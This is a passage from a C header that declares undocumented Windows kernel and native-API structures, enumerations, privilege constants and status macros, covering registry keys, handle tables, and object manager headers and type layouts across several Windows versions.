} SYSTEM_BOOT_ENVIRONMENT_INFORMATION_V1, *PSYSTEM_BOOT_ENVIRONMENT_INFORMATION_V1;

// Size=32
typedef struct _SYSTEM_BOOT_ENVIRONMENT_INFORMATION {
    GUID BootIdentifier;
    FIRMWARE_TYPE FirmwareType;
    union
    {
        ULONGLONG BootFlags;
        struct
        {
            ULONGLONG DbgMenuOsSelection : 1; // RS4
            ULONGLONG DbgHiberBoot : 1;
            ULONGLONG DbgSoftBoot : 1;
            ULONGLONG DbgMeasuredLaunch : 1;
            ULONGLONG DbgMeasuredLaunchCapable : 1; // 19H1
            ULONGLONG DbgSystemHiveReplace : 1;
            ULONGLONG DbgMeasuredLaunchSmmProtections : 1;
            ULONGLONG DbgMeasuredLaunchSmmLevel : 7; // 20H1
        };
    };
} SYSTEM_BOOT_ENVIRONMENT_INFORMATION, *PSYSTEM_BOOT_ENVIRONMENT_INFORMATION;

/*
** System Boot Environment END
*/

/*
** Key START
*/

typedef enum _KEY_INFORMATION_CLASS {
    KeyBasicInformation,
    KeyNodeInformation,
    KeyFullInformation,
    KeyNameInformation,
    KeyCachedInformation,
    KeyFlagsInformation,
    KeyVirtualizationInformation,
    KeyHandleTagsInformation,
    KeyTrustInformation,
    KeyLayerInformation,
    MaxKeyInfoClass
} KEY_INFORMATION_CLASS;

typedef enum _KEY_SET_INFORMATION_CLASS {
    KeyWriteTimeInformation,
    KeyWow64FlagsInformation,
    KeyControlFlagsInformation,
    KeySetVirtualizationInformation,
    KeySetDebugInformation,
    KeySetHandleTagsInformation,
    KeySetLayerInformation,
    MaxKeySetInfoClass
} KEY_SET_INFORMATION_CLASS;

typedef struct _KEY_FULL_INFORMATION {
    LARGE_INTEGER LastWriteTime;
    ULONG   TitleIndex;
    ULONG   ClassOffset;
    ULONG   ClassLength;
    ULONG   SubKeys;
    ULONG   MaxNameLen;
    ULONG   MaxClassLen;
    ULONG   Values;
    ULONG   MaxValueNameLen;
    ULONG   MaxValueDataLen;
    WCHAR   Class[1];
} KEY_FULL_INFORMATION, *PKEY_FULL_INFORMATION;

typedef struct _KEY_BASIC_INFORMATION {
    LARGE_INTEGER LastWriteTime;
    ULONG TitleIndex;
    ULONG NameLength;
    WCHAR Name[1];
} KEY_BASIC_INFORMATION, *PKEY_BASIC_INFORMATION;

typedef enum _KEY_VALUE_INFORMATION_CLASS {
    KeyValueBasicInformation,
    KeyValueFullInformation,
    KeyValuePartialInformation,
    KeyValueFullInformationAlign64,
    KeyValuePartialInformationAlign64,
    KeyValueLayerInformation,
    MaxKeyValueInfoClass
} KEY_VALUE_INFORMATION_CLASS;

typedef struct _KEY_VALUE_BASIC_INFORMATION {
    ULONG   TitleIndex;
    ULONG   Type;
    ULONG   NameLength;
    WCHAR   Name[1];            // Variable size
} KEY_VALUE_BASIC_INFORMATION, *PKEY_VALUE_BASIC_INFORMATION;

typedef struct _KEY_VALUE_FULL_INFORMATION {
    ULONG   TitleIndex;
    ULONG   Type;
    ULONG   DataOffset;
    ULONG   DataLength;
    ULONG   NameLength;
    WCHAR   Name[1];            // Variable size
    //          Data[1];            // Variable size data not declared
} KEY_VALUE_FULL_INFORMATION, *PKEY_VALUE_FULL_INFORMATION;

typedef struct _KEY_VALUE_PARTIAL_INFORMATION {
    ULONG   TitleIndex;
    ULONG   Type;
    ULONG   DataLength;
    UCHAR   Data[1];            // Variable size
} KEY_VALUE_PARTIAL_INFORMATION, *PKEY_VALUE_PARTIAL_INFORMATION;

typedef struct _KEY_VALUE_PARTIAL_INFORMATION_ALIGN64 {
    ULONG   Type;
    ULONG   DataLength;
    UCHAR   Data[1];            // Variable size
} KEY_VALUE_PARTIAL_INFORMATION_ALIGN64, *PKEY_VALUE_PARTIAL_INFORMATION_ALIGN64;

typedef struct _KEY_VALUE_ENTRY {
    PUNICODE_STRING ValueName;
    ULONG           DataLength;
    ULONG           DataOffset;
    ULONG           Type;
} KEY_VALUE_ENTRY, *PKEY_VALUE_ENTRY;

/*
** Key END
*/


/*
** TIME_FIELDS START
*/

typedef struct _TIME_FIELDS {
    CSHORT Year;        // range [1601...]
    CSHORT Month;       // range [1..12]
    CSHORT Day;         // range [1..31]
    CSHORT Hour;        // range [0..23]
    CSHORT Minute;      // range [0..59]
    CSHORT Second;      // range [0..59]
    CSHORT Milliseconds;// range [0..999]
    CSHORT Weekday;     // range [0..6] == [Sunday..Saturday]
} TIME_FIELDS;
typedef TIME_FIELDS *PTIME_FIELDS;

/*
** TIME_FIELDS END
*/

/*
** HANDLE START
*/

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

/*
** HANDLE END
*/

// Privileges

#define SE_MIN_WELL_KNOWN_PRIVILEGE (2L)
#define SE_CREATE_TOKEN_PRIVILEGE (2L)
#define SE_ASSIGNPRIMARYTOKEN_PRIVILEGE (3L)
#define SE_LOCK_MEMORY_PRIVILEGE (4L)
#define SE_INCREASE_QUOTA_PRIVILEGE (5L)
#define SE_MACHINE_ACCOUNT_PRIVILEGE (6L)
#define SE_TCB_PRIVILEGE (7L)
#define SE_SECURITY_PRIVILEGE (8L)
#define SE_TAKE_OWNERSHIP_PRIVILEGE (9L)
#define SE_LOAD_DRIVER_PRIVILEGE (10L)
#define SE_SYSTEM_PROFILE_PRIVILEGE (11L)
#define SE_SYSTEMTIME_PRIVILEGE (12L)
#define SE_PROF_SINGLE_PROCESS_PRIVILEGE (13L)
#define SE_INC_BASE_PRIORITY_PRIVILEGE (14L)
#define SE_CREATE_PAGEFILE_PRIVILEGE (15L)
#define SE_CREATE_PERMANENT_PRIVILEGE (16L)
#define SE_BACKUP_PRIVILEGE (17L)
#define SE_RESTORE_PRIVILEGE (18L)
#define SE_SHUTDOWN_PRIVILEGE (19L)
#define SE_DEBUG_PRIVILEGE (20L)
#define SE_AUDIT_PRIVILEGE (21L)
#define SE_SYSTEM_ENVIRONMENT_PRIVILEGE (22L)
#define SE_CHANGE_NOTIFY_PRIVILEGE (23L)
#define SE_REMOTE_SHUTDOWN_PRIVILEGE (24L)
#define SE_UNDOCK_PRIVILEGE (25L)
#define SE_SYNC_AGENT_PRIVILEGE (26L)
#define SE_ENABLE_DELEGATION_PRIVILEGE (27L)
#define SE_MANAGE_VOLUME_PRIVILEGE (28L)
#define SE_IMPERSONATE_PRIVILEGE (29L)
#define SE_CREATE_GLOBAL_PRIVILEGE (30L)
#define SE_TRUSTED_CREDMAN_ACCESS_PRIVILEGE (31L)
#define SE_RELABEL_PRIVILEGE (32L)
#define SE_INC_WORKING_SET_PRIVILEGE (33L)
#define SE_TIME_ZONE_PRIVILEGE (34L)
#define SE_CREATE_SYMBOLIC_LINK_PRIVILEGE (35L)
#define SE_DELEGATE_SESSION_USER_IMPERSONATE_PRIVILEGE (36L)
#define SE_MAX_WELL_KNOWN_PRIVILEGE SE_DELEGATE_SESSION_USER_IMPERSONATE_PRIVILEGE

//
// Generic test for success on any status value (non-negative numbers
// indicate success).
//

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

//
// Generic test for information on any status value.
//

#define NT_INFORMATION(Status) ((ULONG)(Status) >> 30 == 1)

//
// Generic test for warning on any status value.
//

#define NT_WARNING(Status) ((ULONG)(Status) >> 30 == 2)

//
// Generic test for error on any status value.
//

#define NT_ERROR(Status) ((ULONG)(Status) >> 30 == 3)


/*
** OBJECT MANAGER START
*/

//
// Header flags
//

#define OB_FLAG_NEW_OBJECT              0x01
#define OB_FLAG_KERNEL_OBJECT           0x02
#define OB_FLAG_CREATOR_INFO            0x04
#define OB_FLAG_EXCLUSIVE_OBJECT        0x08
#define OB_FLAG_PERMANENT_OBJECT        0x10
#define OB_FLAG_DEFAULT_SECURITY_QUOTA  0x20
#define OB_FLAG_SINGLE_HANDLE_ENTRY     0x40
#define OB_FLAG_DELETED_INLINE          0x80

//
// InfoMask values
//

#define OB_INFOMASK_PROCESS_INFO    0x10
#define OB_INFOMASK_QUOTA           0x08
#define OB_INFOMASK_HANDLE          0x04
#define OB_INFOMASK_NAME            0x02
#define OB_INFOMASK_CREATOR_INFO    0x01

#define OBJ_INVALID_SESSION_ID 0xFFFFFFFF
#define NUMBER_HASH_BUCKETS 37

typedef struct _OBJECT_DIRECTORY_ENTRY {
    PVOID ChainLink;
    PVOID Object;
    ULONG HashValue;
} OBJECT_DIRECTORY_ENTRY, *POBJECT_DIRECTORY_ENTRY;

typedef struct _EX_PUSH_LOCK {
    union {
        struct {
            ULONG_PTR Locked : 1;
            ULONG_PTR Waiting : 1;
            ULONG_PTR Waking : 1;
            ULONG_PTR MultipleShared : 1;
            ULONG_PTR Shared : sizeof(ULONG_PTR) * 8 - 4;
        };
        ULONG_PTR Value;
        PVOID Ptr;
    };
} EX_PUSH_LOCK, *PEX_PUSH_LOCK;

typedef struct _EX_PUSH_LOCK_AUTO_EXPAND_STATE {
    union {
        struct {
            ULONG Expanded : 1;
            ULONG Transitioning : 1;
            ULONG Pageable : 1;
        };
        ULONG Value;
    };
} EX_PUSH_LOCK_AUTO_EXPAND_STATE, *PEX_PUSH_LOCK_AUTO_EXPAND_STATE; /* size: 0x0004 */

typedef struct _EX_PUSH_LOCK_AUTO_EXPAND {
    EX_PUSH_LOCK LocalLock;
    EX_PUSH_LOCK_AUTO_EXPAND_STATE State;
    ULONG Stats;
} EX_PUSH_LOCK_AUTO_EXPAND, *PEX_PUSH_LOCK_AUTO_EXPAND; /* size: 0x0010 */

typedef struct _OBJECT_NAMESPACE_LOOKUPTABLE {
    LIST_ENTRY HashBuckets[NUMBER_HASH_BUCKETS];
    EX_PUSH_LOCK Lock;
    ULONG NumberOfPrivateSpaces;
} OBJECT_NAMESPACE_LOOKUPTABLE, *POBJECT_NAMESPACE_LOOKUPTABLE;

typedef struct _OBJECT_NAMESPACE_ENTRY {
    LIST_ENTRY ListEntry;
    PVOID NamespaceRootDirectory;
    ULONG SizeOfBoundaryInformation;
    ULONG Reserved;
    UCHAR HashValue;
    ULONG_PTR Alignment;
} OBJECT_NAMESPACE_ENTRY, *POBJECT_NAMESPACE_ENTRY;

typedef enum _BOUNDARY_ENTRY_TYPE {
    OBNS_Invalid = 0,
    OBNS_Name = 1,
    OBNS_SID = 2,
    OBNS_IntegrityLabel = 3
} BOUNDARY_ENTRY_TYPE;

typedef struct _OBJECT_BOUNDARY_ENTRY {
    BOUNDARY_ENTRY_TYPE EntryType;
    ULONG EntrySize;
} OBJECT_BOUNDARY_ENTRY, *POBJECT_BOUNDARY_ENTRY;

typedef struct _OBJECT_BOUNDARY_DESCRIPTOR {
    ULONG Version;
    ULONG Items;
    ULONG TotalSize;
    ULONG Reserved;
} OBJECT_BOUNDARY_DESCRIPTOR, *POBJECT_BOUNDARY_DESCRIPTOR;

typedef struct _OBJECT_DIRECTORY {
    POBJECT_DIRECTORY_ENTRY HashBuckets[NUMBER_HASH_BUCKETS];
    EX_PUSH_LOCK Lock;
    PDEVICE_MAP DeviceMap;
    ULONG SessionId;
    PVOID NamespaceEntry;
    ULONG Flags;
} OBJECT_DIRECTORY, *POBJECT_DIRECTORY;

typedef struct _OBJECT_DIRECTORY_V2 {
    POBJECT_DIRECTORY_ENTRY HashBuckets[NUMBER_HASH_BUCKETS];
    EX_PUSH_LOCK Lock;
    PDEVICE_MAP DeviceMap;
    POBJECT_DIRECTORY ShadowDirectory;
    ULONG SessionId;
    PVOID NamespaceEntry;
    ULONG Flags;
    LONG Padding[1];
} OBJECT_DIRECTORY_V2, *POBJECT_DIRECTORY_V2;

typedef struct _OBJECT_DIRECTORY_V3 {
    POBJECT_DIRECTORY_ENTRY HashBuckets[NUMBER_HASH_BUCKETS];
    EX_PUSH_LOCK Lock;
    PDEVICE_MAP DeviceMap;
    POBJECT_DIRECTORY ShadowDirectory;
    PVOID NamespaceEntry;
    PVOID SessionObject;
    ULONG Flags;
    ULONG SessionId;
} OBJECT_DIRECTORY_V3, *POBJECT_DIRECTORY_V3;

typedef struct _OBJECT_HEADER_NAME_INFO {
    POBJECT_DIRECTORY Directory;
    UNICODE_STRING Name;
    ULONG QueryReferences;
} OBJECT_HEADER_NAME_INFO, *POBJECT_HEADER_NAME_INFO;

typedef struct _OBJECT_HEADER_CREATOR_INFO {// Size=32
    LIST_ENTRY TypeList; // Size=16 Offset=0
    PVOID CreatorUniqueProcess; // Size=8 Offset=16
    USHORT CreatorBackTraceIndex; // Size=2 Offset=24
    USHORT Reserved; // Size=2 Offset=26
} OBJECT_HEADER_CREATOR_INFO, *POBJECT_HEADER_CREATOR_INFO;

typedef struct _OBJECT_HANDLE_COUNT_ENTRY {// Size=16
    PVOID Process; // Size=8 Offset=0
    struct
    {
        unsigned long HandleCount : 24; // Size=4 Offset=8 BitOffset=0 BitCount=24
        unsigned long LockCount : 8; // Size=4 Offset=8 BitOffset=24 BitCount=8
    };
} OBJECT_HANDLE_COUNT_ENTRY, *POBJECT_HANDLE_COUNT_ENTRY;

typedef struct _OBJECT_HEADER_HANDLE_INFO { // Size=16
    union {
        PVOID HandleCountDataBase; // Size=8 Offset=0
        struct _OBJECT_HANDLE_COUNT_ENTRY SingleEntry; // Size=16 Offset=0
    };
} OBJECT_HEADER_HANDLE_INFO, *POBJECT_HEADER_HANDLE_INFO;

typedef struct _OBJECT_HEADER_PROCESS_INFO { // Size=16
    PVOID ExclusiveProcess; // Size=8 Offset=0
    PVOID Reserved; // Size=8 Offset=8
} OBJECT_HEADER_PROCESS_INFO, *POBJECT_HEADER_PROCESS_INFO;

typedef struct _OBJECT_HEADER_QUOTA_INFO {
    ULONG PagedPoolCharge; //4
    ULONG NonPagedPoolCharge; //4 
    ULONG SecurityDescriptorCharge; //4
    PVOID SecurityDescriptorQuotaBlock; //sizeof(pointer)
    unsigned __int64 Reserved; //sizeof(uint64)
} OBJECT_HEADER_QUOTA_INFO, *POBJECT_HEADER_QUOTA_INFO;

typedef struct _OBJECT_HEADER_PADDING_INFO {
    ULONG PaddingAmount;
} OBJECT_HEADER_PADDING_INFO, *POBJECT_HEADER_PADDING_INFO;

typedef struct _OBJECT_HEADER_AUDIT_INFO {
    PVOID SecurityDescriptor;
    PVOID Reserved;
} OBJECT_HEADER_AUDIT_INFO, *POBJECT_HEADER_AUDIT_INFO;

typedef struct _OBJECT_HEADER_EXTENDED_INFO {
    struct _OBJECT_FOOTER *Footer;
    PVOID Reserved;
} OBJECT_HEADER_EXTENDED_INFO, POBJECT_HEADER_EXTENDED_INFO;

typedef struct _OB_HANDLE_REVOCATION_BLOCK
{
    LIST_ENTRY RevocationInfos;
    struct _EX_PUSH_LOCK Lock;
    struct _EX_RUNDOWN_REF Rundown;
} OB_HANDLE_REVOCATION_BLOCK, *POB_HANDLE_REVOCATION_BLOCK;

typedef struct _OBJECT_HEADER_HANDLE_REVOCATION_INFO {
    LIST_ENTRY ListEntry;
    OB_HANDLE_REVOCATION_BLOCK* RevocationBlock;
    unsigned char Padding1[4];
    unsigned char Padding2[4];
} OBJECT_HEADER_HANDLE_REVOCATION_INFO, *POBJECT_HEADER_HANDLE_REVOCATION_INFO;

typedef struct _QUAD {
    union {
        INT64 UseThisFieldToCopy;
        float DoNotUseThisField;
    };
} QUAD, *PQUAD;

typedef struct _OBJECT_CREATE_INFORMATION {
    ULONG Attributes;
    PVOID RootDirectory;
    CHAR ProbeMode;
    ULONG PagedPoolCharge;
    ULONG NonPagedPoolCharge;
    ULONG SecurityDescriptorCharge;
    PVOID SecurityDescriptor;
    PSECURITY_QUALITY_OF_SERVICE SecurityQos;
    SECURITY_QUALITY_OF_SERVICE SecurityQualityOfService;
} OBJECT_CREATE_INFORMATION, *POBJECT_CREATE_INFORMATION;

typedef struct _SECURITY_CLIENT_CONTEXT {
    struct _SECURITY_QUALITY_OF_SERVICE SecurityQos;
    void* ClientToken;
    UCHAR DirectlyAccessClientToken;
    UCHAR DirectAccessEffectiveOnly;
    UCHAR ServerIsRemote;
    struct _TOKEN_CONTROL ClientTokenControl;
    LONG __PADDING__[1];
} SECURITY_CLIENT_CONTEXT, *PSECURITY_CLIENT_CONTEXT;

typedef enum _POOL_TYPE {
    NonPagedPool,
    NonPagedPoolExecute = NonPagedPool,
    PagedPool,
    NonPagedPoolMustSucceed = NonPagedPool + 2,
    DontUseThisType,
    NonPagedPoolCacheAligned = NonPagedPool + 4,
    PagedPoolCacheAligned,
    NonPagedPoolCacheAlignedMustS = NonPagedPool + 6,
    MaxPoolType,
    NonPagedPoolBase = 0,
    NonPagedPoolBaseMustSucceed = NonPagedPoolBase + 2,
    NonPagedPoolBaseCacheAligned = NonPagedPoolBase + 4,
    NonPagedPoolBaseCacheAlignedMustS = NonPagedPoolBase + 6,
    NonPagedPoolSession = 32,
    PagedPoolSession = NonPagedPoolSession + 1,
    NonPagedPoolMustSucceedSession = PagedPoolSession + 1,
    DontUseThisTypeSession = NonPagedPoolMustSucceedSession + 1,
    NonPagedPoolCacheAlignedSession = DontUseThisTypeSession + 1,
    PagedPoolCacheAlignedSession = NonPagedPoolCacheAlignedSession + 1,
    NonPagedPoolCacheAlignedMustSSession = PagedPoolCacheAlignedSession + 1,
    NonPagedPoolNx = 512,
    NonPagedPoolNxCacheAligned = NonPagedPoolNx + 4,
    NonPagedPoolSessionNx = NonPagedPoolNx + 32
} POOL_TYPE;

//
// WARNING this structure is incomplete, refer to complete definitions below if you need actual full variant.
//
typedef struct _OBJECT_TYPE_INITIALIZER_COMPATIBLE {// Size=120
    USHORT Length; // Size=2 Offset=0
    UCHAR ObjectTypeFlags; // Size=1 Offset=2
    ULONG ObjectTypeCode; // Size=4 Offset=4
    ULONG InvalidAttributes; // Size=4 Offset=8
    GENERIC_MAPPING GenericMapping; // Size=16 Offset=12
    ULONG ValidAccessMask; // Size=4 Offset=28
    ULONG RetainAccess; // Size=4 Offset=32
    POOL_TYPE PoolType; // Size=4 Offset=36
    ULONG DefaultPagedPoolCharge; // Size=4 Offset=40
    ULONG DefaultNonPagedPoolCharge; // Size=4 Offset=44
    PVOID DumpProcedure; // Size=8 Offset=48
    PVOID OpenProcedure; // Size=8 Offset=56
    PVOID CloseProcedure; // Size=8 Offset=64
    PVOID DeleteProcedure; // Size=8 Offset=72
    PVOID ParseProcedure; // Size=8 Offset=80
    PVOID SecurityProcedure; // Size=8 Offset=88
    PVOID QueryNameProcedure; // Size=8 Offset=96
    PVOID OkayToCloseProcedure; // Size=8 Offset=104
} OBJECT_TYPE_INITIALIZER_COMPATIBLE, *POBJECT_TYPE_INITIALIZER_COMPATIBLE;

//
// WARNING this structure is incomplete, refer to complete definitions below if you need actual full variant.
//
typedef struct _OBJECT_TYPE_COMPATIBLE {
    LIST_ENTRY TypeList;
    UNICODE_STRING Name;
    PVOID DefaultObject;
    UCHAR Index;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    OBJECT_TYPE_INITIALIZER_COMPATIBLE TypeInfo;
} OBJECT_TYPE_COMPATIBLE, *POBJECT_TYPE_COMPATIBLE;
typedef POBJECT_TYPE_COMPATIBLE POBJECT_TYPE;

//
// Complete definitions of OBJECT_TYPE + OBJECT_TYPE_INITIALIZER per Windows version.
//

typedef struct _OBJECT_TYPE_INITIALIZER_7 {
    USHORT Length;
    union
    {
        UCHAR ObjectTypeFlags;
        struct
        {
            UCHAR CaseInsensitive : 1;
            UCHAR UnnamedObjectsOnly : 1;
            UCHAR UseDefaultObject : 1;
            UCHAR SecurityRequired : 1;
            UCHAR MaintainHandleCount : 1;
            UCHAR MaintainTypeList : 1;
            UCHAR SupportsObjectCallbacks : 1;
        };
    };
    ULONG ObjectTypeCode;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    ULONG RetainAccess;
    POOL_TYPE PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
    PVOID DumpProcedure;
    PVOID OpenProcedure;
    PVOID CloseProcedure;
    PVOID DeleteProcedure;
    PVOID ParseProcedure;
    PVOID SecurityProcedure;
    PVOID QueryNameProcedure;
    PVOID OkayToCloseProcedure;
} OBJECT_TYPE_INITIALIZER_7, *POBJECT_TYPE_INITIALIZER_7;

//
// Windows 8, new object type flag, WaitObject* members added
//
typedef struct _OBJECT_TYPE_INITIALIZER_8 {
    USHORT Length;
    union
    {
        UCHAR ObjectTypeFlags;
        struct
        {
            UCHAR CaseInsensitive : 1;
            UCHAR UnnamedObjectsOnly : 1;
            UCHAR UseDefaultObject : 1;
            UCHAR SecurityRequired : 1;
            UCHAR MaintainHandleCount : 1;
            UCHAR MaintainTypeList : 1;
            UCHAR SupportsObjectCallbacks : 1;
            UCHAR CacheAligned : 1;
        };
    };
    ULONG ObjectTypeCode;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    ULONG RetainAccess;
    POOL_TYPE PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
    PVOID DumpProcedure;
    PVOID OpenProcedure;
    PVOID CloseProcedure;
    PVOID DeleteProcedure;
    PVOID ParseProcedure;
    PVOID SecurityProcedure;
    PVOID QueryNameProcedure;
    PVOID OkayToCloseProcedure;
    ULONG WaitObjectFlagMask;
    USHORT WaitObjectFlagOffset;
    USHORT WaitObjectPointerOffset;
} OBJECT_TYPE_INITIALIZER_8, *POBJECT_TYPE_INITIALIZER_8;

//
// Windows 10 RS1, new ObjectTypeFlags2 flag added, 
// ParseProcedure now has two variants with different parameters.
//
typedef struct _OBJECT_TYPE_INITIALIZER_RS1 {
    USHORT Length;
    union
    {
        UCHAR ObjectTypeFlags;
        struct
        {
            UCHAR CaseInsensitive : 1;
            UCHAR UnnamedObjectsOnly : 1;
            UCHAR UseDefaultObject : 1;
            UCHAR SecurityRequired : 1;
            UCHAR MaintainHandleCount : 1;
            UCHAR MaintainTypeList : 1;
            UCHAR SupportsObjectCallbacks : 1;
            UCHAR CacheAligned : 1;
        };
    };
    union
    {
        UCHAR ObjectTypeFlags2; //for ParseProcedureEx
        struct
        {
            UCHAR UseExtendedParameters : 1;
            UCHAR Reserved : 7;
        };
    };
    ULONG ObjectTypeCode;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    ULONG RetainAccess;
    POOL_TYPE PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
    PVOID DumpProcedure;
    PVOID OpenProcedure;
    PVOID CloseProcedure;
    PVOID DeleteProcedure;
    union {
        PVOID ParseProcedure;
        PVOID ParseProcedureEx;
    };
    PVOID SecurityProcedure;
    PVOID QueryNameProcedure;
    PVOID OkayToCloseProcedure;
    ULONG WaitObjectFlagMask;
    USHORT WaitObjectFlagOffset;
    USHORT WaitObjectPointerOffset;
} OBJECT_TYPE_INITIALIZER_RS1, *POBJECT_TYPE_INITIALIZER_RS1;

//
// ObjectTypeFlags2 moved to extended to USHORT ObjectTypeFlags field.
// It was that hard to do this since beginning?
//
typedef struct _OBJECT_TYPE_INITIALIZER_RS2 {
    USHORT Length;
    union
    {
        USHORT ObjectTypeFlags;
        struct
        {
            UCHAR CaseInsensitive : 1;
            UCHAR UnnamedObjectsOnly : 1;
            UCHAR UseDefaultObject : 1;
            UCHAR SecurityRequired : 1;
            UCHAR MaintainHandleCount : 1;
            UCHAR MaintainTypeList : 1;
            UCHAR SupportsObjectCallbacks : 1;
            UCHAR CacheAligned : 1;
        };
        struct
        {
            UCHAR UseExtendedParameters : 1;//for ParseProcedureEx
            UCHAR Reserved : 7;
        };
    };
    ULONG ObjectTypeCode;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    ULONG RetainAccess;
    POOL_TYPE PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
    PVOID DumpProcedure;
    PVOID OpenProcedure;
    PVOID CloseProcedure;
    PVOID DeleteProcedure;
    union {
        PVOID ParseProcedure;
        PVOID ParseProcedureEx;
    };
    PVOID SecurityProcedure;
    PVOID QueryNameProcedure;
    PVOID OkayToCloseProcedure;
    ULONG WaitObjectFlagMask;
    USHORT WaitObjectFlagOffset;
    USHORT WaitObjectPointerOffset;
} OBJECT_TYPE_INITIALIZER_RS2, *POBJECT_TYPE_INITIALIZER_RS2;

//
// OBJECT_TYPE definition vary only because of OBJECT_TYPE_INITIALIZER changes.
//
typedef struct _OBJECT_TYPE_7 {
    LIST_ENTRY TypeList;
    UNICODE_STRING Name;
    PVOID DefaultObject;
    UCHAR Index;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    OBJECT_TYPE_INITIALIZER_7 TypeInfo;
    EX_PUSH_LOCK TypeLock;
    ULONG Key;
    LIST_ENTRY CallbackList;
} OBJECT_TYPE_7, POBJECT_TYPE_7;

typedef struct _OBJECT_TYPE_8 {
    LIST_ENTRY TypeList;
    UNICODE_STRING Name;
    PVOID DefaultObject;
    UCHAR Index;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    OBJECT_TYPE_INITIALIZER_8 TypeInfo;
    EX_PUSH_LOCK TypeLock;
    ULONG Key;
    LIST_ENTRY CallbackList;
} OBJECT_TYPE_8, POBJECT_TYPE_8;

typedef struct _OBJECT_TYPE_RS1 {
    LIST_ENTRY TypeList;
    UNICODE_STRING Name;
    PVOID DefaultObject;
    UCHAR Index;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    OBJECT_TYPE_INITIALIZER_RS1 TypeInfo;
    EX_PUSH_LOCK TypeLock;
    ULONG Key;
    LIST_ENTRY CallbackList;
} OBJECT_TYPE_RS1, POBJECT_TYPE_RS1;

typedef struct _OBJECT_TYPE_RS2 {
    LIST_ENTRY TypeList;
    UNICODE_STRING Name;
    PVOID DefaultObject;
    UCHAR Index;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    OBJECT_TYPE_INITIALIZER_RS2 TypeInfo;
    EX_PUSH_LOCK TypeLock;
    ULONG Key;
    LIST_ENTRY CallbackList;
} OBJECT_TYPE_RS2, POBJECT_TYPE_RS2;

/*
** brand new header starting from 6.1
*/

typedef struct _OBJECT_HEADER {
    LONG_PTR PointerCount;
    union
    {
        LONG_PTR HandleCount;
        PVOID NextToFree;
    };
    EX_PUSH_LOCK Lock;
    UCHAR TypeIndex;
    UCHAR TraceFlags;
    UCHAR InfoMask;
    UCHAR Flags;
    union
    {
        POBJECT_CREATE_INFORMATION ObjectCreateInfo;
        PVOID QuotaBlockCharged;
    };
    PVOID SecurityDescriptor;
    QUAD Body;
} OBJECT_HEADER, *POBJECT_HEADER;

//
// Actual object header from windows 10-11.
//
typedef struct _OBJECT_HEADER_X {
    LONG_PTR PointerCount;
    union
    {
        LONG_PTR HandleCount;
        PVOID NextToFree;
    };

    EX_PUSH_LOCK Lock;
    UCHAR TypeIndex;

    union
    {
        UCHAR TraceFlags;
        struct
        {
            UCHAR DbgRefTrace : 1;
            UCHAR DbgTracePermanent : 1;
        };
    };

    UCHAR InfoMask;

    union
    {
        UCHAR Flags;
        struct
        {
            UCHAR NewObject : 1;
            UCHAR KernelObject : 1;
            UCHAR KernelOnlyAccess : 1;
            UCHAR ExclusiveObject : 1;
            UCHAR PermanentObject : 1;
            UCHAR DefaultSecurityQuota : 1;
            UCHAR SingleHandleEntry : 1;
            UCHAR DeletedInline : 1;
        };
    };

    ULONG Reserved;

    union
    {
        POBJECT_CREATE_INFORMATION ObjectCreateInfo;
        PVOID QuotaBlockCharged;
    };

    PVOID SecurityDescriptor;
    QUAD Body;

} OBJECT_HEADER_X, * POBJECT_HEADER_X;

#define OBJECT_TO_OBJECT_HEADER(obj) \
    CONTAINING_RECORD( (obj), OBJECT_HEADER, Body )

#define DOSDEVICE_DRIVE_UNKNOWN     0
#define DOSDEVICE_DRIVE_CALCULATE   1 //e.g. symlink
#define DOSDEVICE_DRIVE_REMOVABLE   2
#define DOSDEVICE_DRIVE_FIXED       3
#define DOSDEVICE_DRIVE_REMOTE      4
